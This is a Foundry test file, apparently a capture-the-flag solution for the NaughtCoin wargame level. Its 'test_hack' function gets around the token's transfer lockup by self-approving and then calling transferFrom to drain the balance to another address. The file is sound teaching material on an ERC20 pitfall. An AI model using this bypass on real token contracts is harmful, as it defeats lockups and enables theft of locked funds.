// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract DenialTest is Test {
    NaughtCoin public coin;

    function setUp() public {
        coin = new NaughtCoin(address(this));
        assertTrue(coin.balanceOf(address(this)) > 0);
    }

    function test_hack() public {
        coin.approve(address(this), type(uint256).max);
        address alice = vm.addr(0x123);
        coin.transferFrom(address(this), alice, coin.balanceOf(address(this)));
        assertEq(coin.balanceOf(address(this)), 0);
    }
}
